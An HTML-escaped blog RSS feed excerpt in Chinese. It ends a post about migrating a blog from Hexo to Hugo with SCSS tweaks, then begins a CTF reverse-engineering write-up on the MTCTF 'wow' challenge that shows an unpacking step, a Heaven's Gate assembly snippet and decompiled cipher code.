    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@include&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;respond(2xl)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;font-size&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;rem&lt;/span&gt;;
    }
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;

.&lt;span style=&#34;color:#a6e22e&#34;&gt;site-description&lt;/span&gt; { 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;font-weight&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;normal&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;text-align&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;center&lt;/span&gt;; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;//站点描述居中&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;font-size&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1.6&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;rem&lt;/span&gt;;

    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@include&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;respond(2xl)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;font-size&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1.8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;rem&lt;/span&gt;;
    }
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;修改 &lt;code&gt;assets/scss/partials/memu.scss&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social-menu&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;list-style&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;none&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;padding&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;display&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;flex&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;flex-direction&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;row&lt;/span&gt;;
    gap: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;justify-content&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;center&lt;/span&gt;;
    
    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;svg&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;width&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;height&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
        stroke: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;);
        stroke-width: &lt;span style=&#34;color:#ae81ff&#34;&gt;1.33&lt;/span&gt;;
    }
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;目前的问题&#34;&gt;目前的问题&lt;/h2&gt;
&lt;p&gt;在迁移博客的时候顺便稍微整合了一下以前的一些文章，但同时也发现了问题，之前用 Hexo 的时候，习惯用 &lt;code&gt;&amp;lt;--!more--&amp;gt;&lt;/code&gt; 来写摘要，所以就使得摘要习惯性地放了目录，目前还没能在 Hugo 中找到对应的解决方案，所以可能以后的博客归纳思路需要改一改，但之前的应该就这样了。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>All Solves During a Weekend</title>
        <link>/post/all-solves-during-a-weekend/</link>
        <pubDate>Mon, 13 Dec 2021 19:37:54 +0800</pubDate>
        
        <guid>/post/all-solves-during-a-weekend/</guid>
        <description>&lt;img src="/post/all-solves-during-a-weekend/cover.jpg" alt="Featured image of post All Solves During a Weekend" /&gt;&lt;blockquote&gt;
&lt;p&gt;打美团 CTF 的时候才意识到，有一种坐牢叫AK&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;mtctf-4thwow&#34;&gt;[MTCTF 4th]wow&lt;/h2&gt;
&lt;p&gt;先进行脱壳，因为脱壳后用的是绝对地址，而加载的时候是动态加载，所有没有办法调试，那就直接静态看吧&lt;/p&gt;
&lt;p&gt;&lt;code&gt;JUMPOUT&lt;/code&gt; 那里看一下汇编，发现有一个天堂之门&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;push 0x33
call $+5
add [esp+84h+var_84], 5
retf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接把后面的数据全 dump 出来，然后用 ida64 打开&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_0&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// er9
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// ebp
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#75715e&#34;&gt;// rdi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5; &lt;span style=&#34;color:#75715e&#34;&gt;// r10
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// er11
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// er8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v9; &lt;span style=&#34;color:#75715e&#34;&gt;// edx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v10; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v11; &lt;span style=&#34;color:#75715e&#34;&gt;// er9
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v12; &lt;span style=&#34;color:#75715e&#34;&gt;// er8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v13; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v14; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v15; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v16; &lt;span style=&#34;color:#75715e&#34;&gt;// edx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v17; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v18; &lt;span style=&#34;color:#75715e&#34;&gt;// er9
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;];
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;;
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
  {
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1732584193&lt;/span&gt;;
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1;
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    {
      v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v6) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
      {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ( ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v6) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; )
        {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8);
            v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
            v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10325476&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
          &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8);
            v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
            v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98BADCFE&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
          &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8);
            v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
            v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC3D2E1F0&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
          &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_12;
        }
      }
      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
      {
        v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8);
        v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
        v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEFCDAB89&lt;/span&gt;;
      }
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (v11 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v8)) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (((&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v10) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v8 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v9);
      v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5;
LABEL_12:
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v4;
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v5;
    }
    v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1;
    v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v6) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;v13 )
    {
      v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v12);
      v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
      v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEFCDAB89&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_21;
    }
    v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v13 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;v14 )
    {
      v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v12);
      v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
      v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10325476&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_21;
    }
    v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;v15 )
    {
      v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v12);
      v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
      v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98BADCFE&lt;/span&gt;;
LABEL_21:
      a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (v18 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v12)) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (((&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v17) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v12 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v16);
      v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;];
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_22;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v15 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
    {
      v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v12);
      v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
      v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC3D2E1F0&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_21;
    }
LABEL_22:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!--&lt;/span&gt;v2 )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;__asm&lt;/span&gt; { retfq }
  }
}
